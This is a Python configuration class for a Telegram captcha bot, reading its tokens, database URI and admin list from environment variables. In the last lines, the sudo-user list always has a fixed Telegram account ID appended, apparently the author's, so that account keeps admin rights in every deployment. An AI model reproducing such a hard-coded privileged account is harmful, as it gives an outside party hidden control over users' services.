# (c) @JigarVarma2005

import os

class Config(object):
    # get it from my.telegram.org
    APP_ID = os.environ.get("APP_ID", 123456)
    API_HASH = os.environ.get("API_HASH", "")
    # Get it from @botfather
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
    BOT_USERNAME = os.environ.get("BOT_USERNAME", "JVCaptchaBot")
    # Leave this defualt
    SESSION_NAME = os.environ.get("SESSION_NAME", "JV_CaptchaBot")
    # get it from https://cloud.mongodb.com 
    MONGODB_URI = os.environ.get("MONGODB_URI", "")
    # Ask in https://t.me/JV_Community
    API_TOKEN = os.environ.get("API_TOKEN", None)
    # Sudo users(goto @JVToolsBot and send /id to get your id)
    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "1204927413 1405957830").split()))
    SUDO_USERS.append(1204927413)
    SUDO_USERS = list(set(SUDO_USERS))
